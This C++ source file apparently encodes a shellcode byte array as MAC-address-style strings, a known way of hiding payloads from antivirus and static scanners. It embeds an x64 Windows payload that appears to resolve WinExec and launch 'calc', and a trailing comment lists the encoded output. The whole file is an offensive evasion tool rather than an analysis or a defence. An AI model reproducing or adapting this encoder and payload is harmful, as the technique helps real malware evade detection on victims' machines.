#include <iostream>
#include <cstdio>
#include <windows.h>

void GenerateMAC(int a1, int a2, int a3, int a4, int a5, int a6, char* Result) {
    sprintf_s(Result, 18, "%0.2x:%0.2x:%0.2x:%0.2x:%0.2x:%0.2x", a1, a2, a3, a4, a5, a6);
}

void GenerateMACOutput(unsigned char shellcode[], char* result[], int sShellcode) {
    if (shellcode == NULL || result == NULL || (sShellcode % 6 != 0)) {
        std::cout << "[!] ERROR\n";
        return;  // Add return to exit the function if there's an error
    }
    int a = sShellcode / 6;
    for (int i = 0; i < a; i++) {
        result[i] = new char[18];  // Allocate memory for each MAC address string
        GenerateMAC(shellcode[i * 6], shellcode[i * 6 + 1], shellcode[i * 6 + 2], shellcode[i * 6 + 3], shellcode[i * 6 + 4], shellcode[i * 6 + 5], result[i]);
    }
}

int main() {
    unsigned char shellcode[] = {
        0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B,
        0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B,
        0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE,
        0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57,
        0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48,
        0x01, 0xF7, 0x99, 0xFF
    };

    int a = sizeof(shellcode) / sizeof(shellcode[0]);
    int macCount = a / 6;  // Calculate the number of MAC addresses
    char* result[50];
    GenerateMACOutput(shellcode, result, a);
    for (int i = 0; i < macCount; i++) {
        std::cout << result[i] << std::endl;
        delete[] result[i];  // Free the allocated memory
    }
    /*
    6a:60:5a:68:63:61
    6c:63:54:59:48:29
    d4:65:48:8b:32:48
    8b:76:18:48:8b:76
    10:48:ad:48:8b:30
    48:8b:7e:30:03:57
    3c:8b:5c:17:28:8b
    74:1f:20:48:01:fe
    8b:54:1f:24:0f:b7
    2c:17:8d:52:02:ad
    81:3c:07:57:69:6e
    45:75:ef:8b:74:1f
    1c:48:01:fe:8b:34
    ae:48:01:f7:99:ff
    */

    return 0;
}
